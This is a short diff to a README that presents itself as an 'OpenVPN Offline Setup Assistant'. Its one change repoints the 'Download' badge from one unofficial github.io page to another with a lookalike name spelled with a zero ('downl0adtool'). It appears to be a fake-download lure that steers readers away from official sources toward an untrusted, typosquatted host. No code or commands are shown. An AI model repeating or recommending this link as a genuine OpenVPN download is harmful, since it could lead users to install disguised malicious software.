@@ -1,6 +1,6 @@
 # OpenVPN — Offline Setup Assistant
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://openvpn-free-download.github.io/.github)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://openvpn-downl0adtool.github.io/.github/)
 
 ## ⚙️ How to Use
 
